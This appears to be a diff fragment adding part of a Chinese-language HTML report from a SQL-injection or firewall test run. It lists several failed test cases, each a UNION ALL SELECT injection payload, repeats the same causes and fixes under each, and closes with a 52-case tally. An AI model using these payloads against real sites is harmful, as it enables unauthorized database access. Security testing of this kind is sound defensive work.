+</div></td><td colspan='5' align='center'><button id='btn_ft1_46' type="button"  class="btn btn-danger btn-xs collapsed" data-toggle="collapse" data-target='#div_ft1_46'>验证</button><div id='div_ft1_46' class="collapse"><pre>原因： 1.没有正确过滤转义字符 2.用户输入错误的数据类型 3.数据库服务器中的漏洞 4.盲目SQL注入式攻击 5.条件响应 6.条件性差错 7.时间延误解决建议： 1.用预编译处理语言  2.轨范出错处理  3.使用专业的漏洞扫描工具</pre></div></td></tr>
+<tr id='ft1_47' class='none'><td class='failCase'><div class='testcase'>1' UNION ALL SELECT CONCAT(0x716b6a7871,0x71586f4c73634c595268,0x7162766b71),NULL,NULL-- hRqV
+</div></td><td colspan='5' align='center'><button id='btn_ft1_47' type="button"  class="btn btn-danger btn-xs collapsed" data-toggle="collapse" data-target='#div_ft1_47'>验证</button><div id='div_ft1_47' class="collapse"><pre>原因： 1.没有正确过滤转义字符 2.用户输入错误的数据类型 3.数据库服务器中的漏洞 4.盲目SQL注入式攻击 5.条件响应 6.条件性差错 7.时间延误解决建议： 1.用预编译处理语言  2.轨范出错处理  3.使用专业的漏洞扫描工具</pre></div></td></tr>
+<tr id='ft1_48' class='none'><td class='failCase'><div class='testcase'>1' UNION ALL SELECT NULL,CONCAT(0x716b6a7871,0x4d495a47507469445964,0x7162766b71),NULL-- sWTh
+</div></td><td colspan='5' align='center'><button id='btn_ft1_48' type="button"  class="btn btn-danger btn-xs collapsed" data-toggle="collapse" data-target='#div_ft1_48'>验证</button><div id='div_ft1_48' class="collapse"><pre>原因： 1.没有正确过滤转义字符 2.用户输入错误的数据类型 3.数据库服务器中的漏洞 4.盲目SQL注入式攻击 5.条件响应 6.条件性差错 7.时间延误解决建议： 1.用预编译处理语言  2.轨范出错处理  3.使用专业的漏洞扫描工具</pre></div></td></tr>
+<tr id='ft1_49' class='none'><td class='failCase'><div class='testcase'>1' UNION ALL SELECT NULL,NULL,CONCAT(0x716b6a7871,0x7056774e477851747558,0x7162766b71)-- ivHA
+</div></td><td colspan='5' align='center'><button id='btn_ft1_49' type="button"  class="btn btn-danger btn-xs collapsed" data-toggle="collapse" data-target='#div_ft1_49'>验证</button><div id='div_ft1_49' class="collapse"><pre>原因： 1.没有正确过滤转义字符 2.用户输入错误的数据类型 3.数据库服务器中的漏洞 4.盲目SQL注入式攻击 5.条件响应 6.条件性差错 7.时间延误解决建议： 1.用预编译处理语言  2.轨范出错处理  3.使用专业的漏洞扫描工具</pre></div></td></tr>
+<tr id='ft1_50' class='none'><td class='failCase'><div class='testcase'>-1594' UNION ALL SELECT CONCAT(0x716b6a7871,0x63566c51666d6a4a674e64466e4374645062635457706f65654156485348477075626b7443535176,0x7162766b71),NULL,NULL-- TbNg
+</div></td><td colspan='5' align='center'><button id='btn_ft1_50' type="button"  class="btn btn-danger btn-xs collapsed" data-toggle="collapse" data-target='#div_ft1_50'>验证</button><div id='div_ft1_50' class="collapse"><pre>原因： 1.没有正确过滤转义字符 2.用户输入错误的数据类型 3.数据库服务器中的漏洞 4.盲目SQL注入式攻击 5.条件响应 6.条件性差错 7.时间延误解决建议： 1.用预编译处理语言  2.轨范出错处理  3.使用专业的漏洞扫描工具</pre></div></td></tr>
+<tr id='ft1_51' class='none'><td class='failCase'><div class='testcase'>-6781' UNION ALL SELECT NULL,NULL,CONCAT(0x716b6a7871,0x706f474d55786e4b55737170614445466d7a4b485647677357576e6c586b684e534d4368505a6756,0x7162766b71)-- IBUQ
+</div></td><td colspan='5' align='center'><button id='btn_ft1_51' type="button"  class="btn btn-danger btn-xs collapsed" data-toggle="collapse" data-target='#div_ft1_51'>验证</button><div id='div_ft1_51' class="collapse"><pre>原因： 1.没有正确过滤转义字符 2.用户输入错误的数据类型 3.数据库服务器中的漏洞 4.盲目SQL注入式攻击 5.条件响应 6.条件性差错 7.时间延误解决建议： 1.用预编译处理语言  2.轨范出错处理  3.使用专业的漏洞扫描工具</pre></div></td></tr>
+<tr id='ft1_52' class='none'><td class='failCase'><div class='testcase'>-6395' UNION ALL SELECT NULL,NULL,CONCAT(0x716b6a7871,(CASE WHEN (9650=</div></td><td colspan='5' align='center'><button id='btn_ft1_52' type="button"  class="btn btn-danger btn-xs collapsed" data-toggle="collapse" data-target='#div_ft1_52'>验证</button><div id='div_ft1_52' class="collapse"><pre>原因： 1.没有正确过滤转义字符 2.用户输入错误的数据类型 3.数据库服务器中的漏洞 4.盲目SQL注入式攻击 5.条件响应 6.条件性差错 7.时间延误解决建议： 1.用预编译处理语言  2.轨范出错处理  3.使用专业的漏洞扫描工具</pre></div></td></tr>
+
+
+<tr id='total_row' class="text-center active">
+    <td>总计</td>
+    <td>52</td>
+    <td>43</td>
+    <td>9</td>
+    <td>0</td>
+    <td>验证率：82.69%</td>
+</tr>
+</table>
+
+<div id='ending'>&nbsp;</div>
+    <div style=" position:fixed;right:50px; bottom:30px; width:20px; height:20px;cursor:pointer">
+    <a href="#"><span class="glyphicon glyphicon-eject" style = "font-size:30px;" aria-hidden="true">
+    </span></a></div>
+    
+
+</body>
+</html>
